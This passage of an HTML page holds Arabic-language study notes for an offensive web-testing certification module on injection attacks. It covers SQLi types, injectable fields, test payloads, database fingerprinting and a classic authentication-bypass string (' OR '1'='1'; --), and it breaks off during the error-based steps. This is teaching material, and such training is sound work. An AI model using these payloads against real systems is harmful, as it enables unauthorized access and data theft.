@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>eWPTXv3 · Module 03: هجمات الحقن المتقدمة</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;
+    --border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout ul{margin:6px 0 0;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@ewptx:~/module-03$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">eWPTXv3 · INE · Module 03</span>
+    <h1>هجمات الحقن المتقدمة (Advanced Injection Attacks)</h1>
+    <p class="lede">من أساسيات SQL Injection وأتمتتها بـ SQLMap، مرورًا بتقنيات OOB وSecond-Order المتقدمة، ووصولًا لـ NoSQL وLDAP وORM وXXE — رحلة كاملة في أخطر فئة ثغرات OWASP Top 10 عبر السنوات.</p>
+    <div class="tags">
+      <span class="tag">sqli</span>
+      <span class="tag">sqlmap</span>
+      <span class="tag">oob-sqli</span>
+      <span class="tag">second-order</span>
+      <span class="tag">nosql-injection</span>
+      <span class="tag">ldap-injection</span>
+      <span class="tag">orm-injection</span>
+      <span class="tag">xxe</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>مقدمة في هجمات الحقن</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>مقدمة في SQL Injection</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>أنواع ثغرات SQL Injection</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>البحث عن ثغرات SQL Injection</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>استغلال Error-Based SQL Injection</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>استغلال Union-Based SQL Injection</span></a>
+  <a class="toc-item" href="#lu7"><span class="toc-num">07</span><span>استغلال Blind SQLi (Boolean & Time-Based)</span></a>
+  <a class="toc-item" href="#lu8"><span class="toc-num">08</span><span>منهجية اختبار SQL Injection الكاملة</span></a>
+  <a class="toc-item" href="#lu9"><span class="toc-num">09</span><span>أساسيات SQLMap</span></a>
+  <a class="toc-item" href="#lu10"><span class="toc-num">10</span><span>SQLMap — التعداد والاستخدام المتقدم</span></a>
+  <a class="toc-item" href="#lu11"><span class="toc-num">11</span><span>حقن SQL خارج النطاق (OOB SQLi)</span></a>
+  <a class="toc-item" href="#lu12"><span class="toc-num">12</span><span>حقن SQL من الدرجة الثانية (Second-Order)</span></a>
+  <a class="toc-item" href="#lu13"><span class="toc-num">13</span><span>أساسيات NoSQL وحقنها</span></a>
+  <a class="toc-item" href="#lu14"><span class="toc-num">14</span><span>مقدمة في LDAP وحقنه</span></a>
+  <a class="toc-item" href="#lu15"><span class="toc-num">15</span><span>مقدمة في ORM وحقنه</span></a>
+  <a class="toc-item" href="#lu16"><span class="toc-num">16</span><span>مقدمة في XML وحقنه</span></a>
+  <a class="toc-item" href="#lu17"><span class="toc-num">17</span><span>XML External Entity (XXE)</span></a>
+  <a class="toc-item" href="#methodology"><span class="toc-num">--</span><span>خريطة قرار اختيار نوع الحقن</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">مقدمة في هجمات الحقن</span></h2>
+
+<h3>تعريف هجمات الحقن (Injection Attacks)</h3>
+<p>بتحدث لما التطبيق يعالج مدخلات غير موثوقة بشكل غير صحيح، وده بيسمح للمهاجم يحقن كود أو أوامر خبيثة في مسار تنفيذ التطبيق — الاستغلال بيتلاعب في طريقة تفاعل التطبيق مع الأنظمة الأساسية زي قواعد البيانات أو أنظمة الملفات أو نظام التشغيل.</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>استغلال التحقق من المدخلات — استهداف بيانات غير مُنقَّاة أو غير مُتحقَّق منها</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>التلاعب في الاستعلامات أو الأوامر — الحمولة المحقونة بتغيّر منطق الاستعلام المرسَل للنظام الخلفي</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>نطاق واسع من الأهداف — قواعد بيانات (SQL)، خدمات دليل (LDAP)، محلّلات XML، قواعد NoSQL، وحتى أنظمة التشغيل</span></div>
+</div>
+
+<h3>أنواع ثغرات الحقن</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الآلية</th><th>التأثير</th></tr></thead>
+<tbody>
+<tr><td>SQL Injection</td><td>استغلال عيوب بناء استعلامات قاعدة البيانات</td><td>سرقة بيانات، وصول غير مصرَّح، تلاعب بالبيانات</td></tr>
+<tr><td>NoSQL Injection</td><td>حقن استعلامات خبيثة عبر مدخلات غير مُتحقَّق منها لقواعد زي MongoDB</td><td>وصول غير مصرَّح، حذف أو تلاعب بالبيانات</td></tr>
+<tr><td>LDAP Injection</td><td>التلاعب في استعلامات LDAP لتجاوز المصادقة أو استرجاع بيانات دليل</td><td>وصول لبيانات دليل حساسة، اختراق النظام</td></tr>
+<tr><td>ORM Injection</td><td>استغلال أطر ORM بحقن استعلامات خبيثة في الكود</td><td>وصول غير مصرَّح، فساد أو كشف البيانات</td></tr>
+<tr><td>XXE Injection</td><td>حقن كيانات XML خبيثة لاستغلال محلّلات XML</td><td>كشف ملفات، SSRF، أو حرمان من الخدمة</td></tr>
+</tbody>
+</table></div>
+
+<h3>انتشار وأثر هجمات الحقن</h3>
+<p>من أعلى الثغرات ترتيبًا في OWASP Top 10 لسنوات متتالية (المرتبة #1 في 2017 والمرتبة #3 في 2021). بتؤثّر على تطبيقات عبر كل الصناعات — تجارة إلكترونية، مالية، رعاية صحية، وأكتر — وبتظهر بكثرة في RESTful وSOAP APIs. أدوات آلية زي SQLMap بتسهّل اكتشاف واستغلال ثغرات الحقن على نطاق واسع.</p>
+<div class="callout case">
+<div class="callout-label">أمثلة واقعية</div>
+<p><strong>TalkTalk (2015):</strong> SQL Injection أدّى لتسريب بيانات 157 ألف عميل. <strong>Equifax (2017):</strong> ثغرات من ضمنها SQL Injection ساهمت في اختراق كشف 147 مليون سجل.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">مقدمة في SQL Injection</span></h2>
+<p>ثغرة حقن بتحدث لما المهاجم يحقن تعليمات SQL خبيثة في حقول إدخال التطبيق — بسبب عدم تحقّق التطبيق من المدخلات بشكل صحيح، مما يسمح بحقن كود/استعلامات SQL تتلاعب في قاعدة البيانات أو تمنح وصول لمعلومات حساسة.</p>
+
+<h3>تاريخ موجز</h3>
+<p>المصطلح صكّه Jeff Forristal ("Rain Forest Puppy") في ورقة بحثية بمؤتمر DefCon 8 سنة 2000. أبرز الحوادث: اختراق شبكة وزارة الطاقة الأمريكية (1998)، سرقة بيانات بطاقات ائتمان من CD Universe (2000 — أول هجوم موثَّق علنًا)، اختراق قاعدة بيانات الأمم المتحدة (2002)، تسريب 6.5 مليون كلمة مرور من LinkedIn (2012)، وتسريب بيانات Ashley Madison (2015).</p>
+
+<h3>تأثير SQL Injection (CIA Triad)</h3>
+<div class="method-grid">
+<div class="method-card"><span class="mnum">C</span><div class="mtitle">السرّية (Confidentiality)</div><div class="mdesc">قواعد بيانات SQL غالبًا بتحتفظ ببيانات حساسة — فقدان السرّية مشكلة متكرّرة جدًا.</div></div>
+<div class="method-card"><span class="mnum">I</span><div class="mtitle">السلامة (Integrity)</div><div class="mdesc">زي ما ممكن تقرأ معلومات حساسة، ممكن كمان تعدّلها أو تحذفها بهجوم SQLi.</div></div>
+<div class="method-card"><span class="mnum">A</span><div class="mtitle">المصادقة (Authentication)</div><div class="mdesc">لو أوامر SQL ضعيفة بتتحقق من اسم المستخدم وكلمة المرور، ممكن تتصل كمستخدم تاني بدون معرفة كلمة المرور.</div></div>
+<div class="method-card"><span class="mnum">D</span><div class="mtitle">التوافر (Availability)</div><div class="mdesc">هجمات SQLi ممكن تأثّر على توافر التطبيق وقاعدة البيانات وتسقط الموقع بفقدان/تلف البيانات.</div></div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">أنواع ثغرات SQL Injection</span></h2>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 170" xmlns="http://www.w3.org/2000/svg">
+  <rect x="270" y="10" width="160" height="40" rx="7" class="dsvg-box"/>
+  <text x="350" y="35" text-anchor="middle" class="dsvg-txt" font-size="12" font-weight="700">SQL Injection</text>
+
+  <rect x="20" y="85" width="140" height="45" rx="7" class="dsvg-box-r"/>
+  <text x="90" y="105" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">In-Band SQLi</text>
+  <text x="90" y="120" text-anchor="middle" class="dsvg-muted" font-size="8">Error / Union</text>
+
+  <rect x="280" y="85" width="140" height="45" rx="7" class="dsvg-box-a"/>
+  <text x="350" y="105" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">Blind SQLi</text>
+  <text x="350" y="120" text-anchor="middle" class="dsvg-muted" font-size="8">Boolean / Time</text>
+
+  <rect x="540" y="85" width="140" height="45" rx="7" class="dsvg-box-g"/>
+  <text x="610" y="105" text-anchor="middle" class="dsvg-green" font-size="11" font-weight="700">Out-of-Band SQLi</text>
+  <text x="610" y="120" text-anchor="middle" class="dsvg-muted" font-size="8">DNS / HTTP</text>
+
+  <line x1="350" y1="50" x2="90" y2="85" class="dsvg-line"/>
+  <line x1="350" y1="50" x2="350" y2="85" class="dsvg-line"/>
+  <line x1="350" y1="50" x2="610" y2="85" class="dsvg-line"/>
+</svg>
+<div class="diagram-caption">التصنيف الثلاثي الرئيسي لـ SQL Injection حسب قناة استخراج النتائج</div>
+</div>
+
+<h3>In-Band SQL Injection</h3>
+<p>النوع الأكثر شيوعًا — المهاجم بيستخدم نفس قناة الاتصال لإرسال الهجوم واستلام النتائج. خطير جدًا لأنه ممكن يُستخدَم لسرقة بيانات حساسة أو تعديل/حذف البيانات أو الاستيلاء الكامل على التطبيق أو السيرفر. ينقسم إلى:</p>
+<ul>
+<li><strong>Error-Based:</strong> حقن كود بيتسبّب في رسالة خطأ من التطبيق — الرسالة ممكن تحتوي معلومات قيّمة عن بنية قاعدة البيانات أو محتواها</li>
+<li><strong>Union-Based:</strong> استخدام عامل UNION لدمج نتائج استعلامين أو أكتر في نتيجة واحدة، لاستخراج بيانات غير مصرَّح بالوصول لها</li>
+</ul>
+
+<h3>Blind SQL Injection</h3>
+<p>التطبيق مش بيُرجع معلومات أو رسائل خطأ مفيدة مباشرة في الاستجابة. المهاجم بيستنتج معلومات عن قاعدة البيانات عبر تقنيات غير مباشرة. ينقسم إلى:</p>
+<ul>
+<li><strong>Boolean-Based:</strong> استغلال استجابة التطبيق لشروط منطقية (صح/خطأ) لاستنتاج معلومات — مثلًا سؤال "هل المستخدم john موجود؟" والاستجابة true أو false</li>
+<li><strong>Time-Based:</strong> استغلال وقت استجابة التطبيق — حقن استعلام بيتسبّب في تأخير، وقياس الوقت المستغرق للاستجابة</li>
+</ul>
+
+<h3>Out-of-Band SQL Injection</h3>
+<p>الأقل شيوعًا — المهاجم بيستخرج بيانات من قاعدة البيانات عبر قناة مختلفة تمامًا عن التطبيق نفسه، بدون الحاجة لاستلام أي استجابة مباشرة من التطبيق. يُستخدَم عبر إرسال طلبات HTTP لسيرفر يتحكّم فيه المهاجم أو عبر استعلامات DNS لاستخراج البيانات.</p>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">البحث عن ثغرات SQL Injection</span></h2>
+
+<h3>الحقول القابلة للحقن الشائعة</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>نماذج تسجيل الدخول (اسم المستخدم وكلمة المرور)</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>مربعات البحث</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>معاملات الرابط (URL Parameters)</span></div>
+  <div class="goal-card"><span class="gi">4</span><span>حقول النماذج (تسجيل، تواصل، تعليقات)</span></div>
+  <div class="goal-card"><span class="gi">5</span><span>الحقول المخفية (Hidden Fields)</span></div>
+  <div class="goal-card"><span class="gi">6</span><span>الكوكيز اللي فيها بيانات مستخدم أو جلسة</span></div>
+</div>
+
+<h3>الحقن حسب نوع البيانات (Integer vs String)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>مثال الاستعلام</th><th>Payloads اختبارية</th></tr></thead>
+<tbody>
+<tr><td>Integer-Based</td><td><code>SELECT * FROM Users WHERE id = FUZZ</code></td><td><code>AND 1</code> (صح) / <code>AND 0</code> (خطأ) / <code>1*56</code> (يرجّع 56 لو عرضة للحقن)</td></tr>
+<tr><td>String-Based</td><td><code>SELECT * FROM Users WHERE name = 'FUZZ'</code></td><td><code>'</code> (خطأ) / <code>''</code> (صح) — علامة الاقتباس المفردة لإنهاء السلسلة النصية</td></tr>
+</tbody>
+</table></div>
+<div class="callout warning">
+<div class="callout-label">قاعدة أساسية</div>
+<p>اختبر حقنة واحدة في كل مرة — لو جرّبت أكتر من واحدة مع بعض، مش هتقدر تحدّد أي Payload هو اللي نجح فعليًا.</p>
+</div>
+
+<h3>استغلال علامة الاقتباس المفردة (')</h3>
+<div class="code-wrap"><span class="code-tag">classic authentication bypass</span><pre><code># الاستعلام الأصلي:
+SELECT * FROM users WHERE username = '&lt;username&gt;' AND password = '&lt;password&gt;'
+
+# الحمولة المحقونة في username:
+' OR '1'='1'; --
+
+# الاستعلام بعد الحقن:
+SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '&lt;password&gt;'
+# الشرط '1'='1' دايمًا صح → تجاوز المصادقة
+</code></pre></div>
+
+<h3>بصمة قاعدة البيانات (Database Fingerprinting)</h3>
+<p>كل DBMS بيستجيب لاستعلامات خاطئة برسائل خطأ مختلفة — مثلًا MS-SQL بترجّع <code>Incorrect syntax near [query]</code>، بينما MySQL بترجّع <code>You have an error in your SQL syntax...</code>. الفرق ده بيساعد في تحديد نوع قاعدة البيانات المستهدَفة.</p>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">استغلال Error-Based SQL Injection</span></h2>
+<p>تقنية بتعتمد على التسبّب المتعمَّد في أخطاء قاعدة بيانات واستخدام رسائل الخطأ المُرجَعة لاستخراج معلومات أو الحصول على وصول غير مصرَّح به.</p>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحديد معامل عرضة للحقن</div>
+<div class="step-body"><p>إيجاد معامل في التطبيق عرضة للحقن — عبر حقول إدخال، معاملات رابط، أو حقول نموذج.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">حقن كود SQL خبيث</div>
